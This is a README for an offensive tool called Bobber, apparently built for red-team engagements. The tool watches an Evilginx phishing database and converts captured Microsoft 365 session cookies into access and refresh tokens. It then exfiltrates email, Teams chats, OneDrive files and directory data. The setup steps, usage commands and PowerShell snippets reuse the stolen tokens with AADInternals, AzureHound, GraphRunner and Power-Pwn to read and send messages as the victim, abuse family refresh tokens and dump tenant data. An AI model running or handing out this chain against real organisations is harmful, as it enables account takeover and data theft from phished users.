# Bobber - Bounces when a fish bites!
```
                                         ▓▓                                                         
                                         ▓▓▓                                                        
                                          ▓▓                                                        
                                          ▓▓▓                                                       
                                           ▓▓                                                       
                                           ▓▓▓                                                      
                                            ▓▓                                                      
                                            ▓▓▓                                                     
                                             ▓▓                                                     
                                             ▓▓▓                                                    
                           ░░░░░░░░░░░░░░░░░░█▓▓▓▓▓░░░░░░░░░░░░░                                    
                 ░░░░░░░░                   ▓▓▓█▓▓▓▓▓             ░░░░░░░░                          
           ░░░░░░             ░░░░░░░░░░░░░▓▓▓▓▓▓█▓█▓▓▓░░░░░░             ░░░░░░                    
      ░░░░░░          ░░░░░░               ▓▓█▓▓▓▓▓▓▓▓▓▓       ░░░░░░           ░░░░░               
   ░░░░░         ░░░░░           ░░░░░░░░░░▓▓▓▓█▓▓▓▓█▓▓▓░░           ░░░░░         ░░░░░            
 ░░░░░        ░░░░░         ░░░░░          ▓█▓▓▓▓█▓▓▓▓█▓▓ ░░░░░         ░░░░░        ░░░░░          
░░░░░        ░░░░        ░░░░░          ░░░▒▓▓▓▓▓▓▓▓█▓▓▓▓    ░░░░░        ░░░░        ░░░░░         
░░░░        ░░░░░        ░░░░          ░░░ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒     ░░░░        ░░░░░        ░░░░       
 ░░░░        ░░░░░        ░░░░░         ░░░░░▒▒▒▒▒▒▒▒▒▒▒  ░░░░░░         ░░░░░        ░░░░      
  ░░░░░        ░░░░░         ░░░░            ░░░░░░         ░░░░░        ░░ 
    ░░░░░         ░░░░░           ░░░░░░░░        ░░░░░░░░           ░░░░░         ░░░   
                                                                        
                                Bobber - Bounces when a fish bites!
```
Bobber monitors a given Evilginx database file for changes, and if a valid Evilginx session complete with a captured Microsoft Office 365 cookie is found, Bobber will utilize the RoadTools RoadTX library to retrieve the access and refresh tokens for the user, then optionally trigger TeamFiltration to exfiltrate all the sweet, sweet loot. Bobber supports monitoring a local file path or a file path on a remote host through SSH.

Bobber accepts a number of input arguments to adjust the RoadTools interactive auth flow, selection between key and credential-based SSH auth, as well as the added benefit of receiving pushover notifications once a user submits their credentials and the loot is on the way.

Checkout the TrustedSec Blogpost [The Triforce of Initial Access](https://www.trustedsec.com), for more information 

```
usage: bobber.py [-h] [--host HOST] [--port PORT] [--username USERNAME] [--password PASSWORD] [--key KEY] [--user-key USER_KEY] [--api-token API_TOKEN] [--all] [--aad] [--teams]
                 [--onedrive] [--owa] [--owa-limit OWA_LIMIT] [-c CLIENT] [-r RESOURCE] [-s SCOPE] [-ru URL] [-t TENANT] [-d DRIVER_PATH] [-k]
                 database_path

positional arguments:
  database_path         Path to the local OR remote Evilginx database file.

options:
  -h, --help            show this help message and exit

SSH Options:
  Evilginx database monitoring SSH options

  --host HOST           SSH hostname/IP when fetching from a remote host.
  --port PORT           SSH port when fetching from a remote host.
  --username USERNAME   SSH username when fetching from a remote host.
  --password PASSWORD   SSH password when fetching from a remote host.
  --key KEY             Path to the SSH private key file for authentication.

Pushover Options:
  Pushover notifications options

  --user-key USER_KEY   Pushover User Key
  --api-token API_TOKEN
                        Pushover API Token

TeamFiltration Options:
  Exfiltration options for TeamFiltration

  --all                 Exfiltrate information from ALL SSO resources (Graph, OWA, SharePoint, OneDrive, Teams)
  --aad                 Exfiltrate information from Graph API (domain users and groups)
  --teams               Exfiltrate information from Teams API (files, chatlogs, attachments, contactlist)
  --onedrive            Exfiltrate information from OneDrive/SharePoint API (accessible SharePoint files and the user's entire OneDrive directory)
  --owa                 Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)
  --owa-limit OWA_LIMIT
                        Set the max amount of emails to exfiltrate, default is 2k.

RoadTools Options:
  RoadTools RoadTX interactive authentication options

  -c CLIENT, --client CLIENT
                        Client ID (application ID / GUID ) to use when authenticating (Teams Client by default)
  -r RESOURCE, --resource RESOURCE
                        Resource to authenticate to. Either a full URL or alias (list with roadtx listaliases)
  -s SCOPE, --scope SCOPE
                        Scope to use. Will automatically switch to v2.0 auth endpoint if specified. If unsure use -r instead.
  -ru URL, --redirect-url URL
                        Redirect URL used when authenticating (default: https://login.microsoftonline.com/common/oauth2/nativeclient)
  -t TENANT, --tenant TENANT
                        Tenant ID or domain to auth to
  -d DRIVER_PATH, --driver-path DRIVER_PATH
                        Path to geckodriver file on disk (download from: https://github.com/mozilla/geckodriver/releases)
  -k, --keep-open       Do not close the browser window after timeout. Useful if you want to browse online apps with the obtained credentials
```
# Setup

1. `git clone https://github.com/Flangvik/Bobber`
2. `pip install -r requirements.txt`
3. Download the latest version of [TeamFiltration](https://github.com/Flangvik/TeamFiltration/releases/latest) for your platform, and place the binary inside the Bobber folder (Optional)
4. Download the latest version of [Geckodriver](https://github.com/mozilla/geckodriver/releases) for your platform, and place the binary inside the Bobber folder
5. `python3 Bobber.py --help` and get going!

# Example Usage

Monitor a remote file for changes via SSH, authenticate using your default ssh key (~/.ssh/id_rsa), keep the browser session open after RoadTools has exchanged captured cookie for JWT tokens, and exfiltrate only AAD Users and Groups data from the Graph API
```powershell
python bobber.py "/root/.evilginx/data.db" --username root --host 1337.66.69.420 --keep-open --aad
```

Monitor a local file for changes, exchange captured cookies for JWT token, and exfiltrate only emails.
```powershell
python bobber.py evilginx_data.db --host 1337.66.69.420  --owa 
```

Monitor a remote file for changes over SSH, authenticate using username and password, exchange captured cookies for JWT tokens, and exfiltrate all data available.
```powershell
python bobber.py "/root/.evilginx/data.db" --username root --password 'MySuperPass123!' --all
```


# Usage with other tools
When Bobber captures a complete Evilginx session, tokens retrieved using RoadTools will be stored in a file using the following naming convention `.sanitized_email_roadtools_auth`. This file can be used in combination with many other tools besides TeamFiltration. Here are a few examples from the context of a PowerShell prompt.

### AADInternals
[AADInternals](https://aadinternals.com/aadinternals/#introduction) is an Modular powershell-framework for exploring the pathways your access might have, created by my favorite finnish person [@DrAzureAD](https://twitter.com/DrAzureAD)

```powershell
#Read and parse the RoadTools auth file into a JSON object
$roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json

#Add the token information from RoadTools to the cache so it will be used for auth
Add-AADIntAccessTokenToCache -AccessToken $roadToolsAuth.accessToken -RefreshToken $roadToolsAuth.refreshToken

#Read Teams messages from the GraphAPI
Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName

# Send a Teams message to an a user using the GraphAPI
Send-AADIntTeamsMessage -Recipients "bruce.wayne@example.com" -Message "Hello there, BATMAN!"

#Abuse [Family Refresh Tokens](https://github.com/secureworks/family-of-client-ids-research#abusing-family-refresh-tokens-for-unauthorized-access-and-persistence-in-azure-active-directory) to refresh as the the "Microsoft Azure PowerShell" Application (1950a258-227b-4e31-a9cf-717495945fc2). Obtains an access token with a different scope.
$msAzJWT =Get-AADIntAccessTokenWithRefreshToken -ClientId "1950a258-227b-4e31-a9cf-717495945fc2" -Resource "https://graph.microsoft.com" -TenantId $roadToolsAuth.tenantId -RefreshToken $roadToolsAuth.refreshToken -SaveToCache 1 -IncludeRefreshToken 1
```

### AzureHound
[AzureHound](https://github.com/BloodHoundAD/AzureHound) is a BloodHound data collector for Microsoft Azure, from the great people over at [@SpecterOps](https://twitter.com/SpecterOps)

```powershell
#Read and parse RoadTools auth file into a JSON object
$roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json

#Use the refresh token and tenantId to run AzureHound against the tenant
./azurehound.exe -r $roadToolsAuth.refreshToken -t $roadToolsAuth.tenantId list -o output.json
```

### GraphRunner
[GraphRunner](https://github.com/dafthack/GraphRunner) Powershell-based post-exploitation toolset for interacting with the Microsoft Graph API, by [@dafthack](https://twitter.com/dafthack)
```powershell
#Import GraphRunner
Import-Module .\GraphRunner.ps1

#Read and parse RoadTools auth file into a JSON object
#While the JSON object of roadtools does not match what GraphRunner needs, enough properties match to "trick" GraphRunner into allowing us to run RefreshGraphTokens
$tokens = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json

#Run RefreshGraphTokens to update our $tokens var 
Invoke-RefreshGraphTokens -RefreshToken $roadToolsAuth.refreshToken -tenantid $roadToolsAuth.tenantId

#Most common command to dump a series of information from the Graph API
Invoke-GraphRunner -Tokens $tokens
```


### Power-Pwn
[Power-Pwn](https://github.com/mbrg/power-pwn) in Python-based offensive security toolset for targeting the Microsoft 365 Power Platform, by [@mbrg0](https://twitter.com/mbrg0)
```powershell
#Read and parse RoadTools auth file into a JSON object
$roadToolsAuth = Get-Content .\firstname_lastname_example_com_roadtools_auth -raw | ConvertFrom-Json

#Create tokens.json in the same directory you are running powerpwn.exe from
@{cli_refresh_token = $roadToolsAuth.refreshToken } | ConvertTo-Json | Set-Content -Path 'tokens.json'

#Perform recon of possible Power Platform deployments
./powerpwn.exe recon -t $roadToolsAuth.tenantId

#Dump data from found Power Platform deployments
./powerpwn.exe dump -t $roadToolsAuth.tenantId
```

# Todo
- [ ] Add an option to specify a proxy URL for token retrieval and exfiltration
- [ ] Allow for capture and notification for other username + password + cookie combinations (then only O365)
- [ ] Options to get Pushover notifications even if only username + password was captured (no cookie)

# Credits
- [@_dirkjan](https://twitter.com/_dirkjan) for the amazing work that is [RoadTools](https://github.com/dirkjanm/ROADtools) 
- [mrgretzky](https://twitter.com/mrgretzky) for raising the standard of phishing simulation with the [evilginx2](https://github.com/kgretzky/evilginx2) toolkit
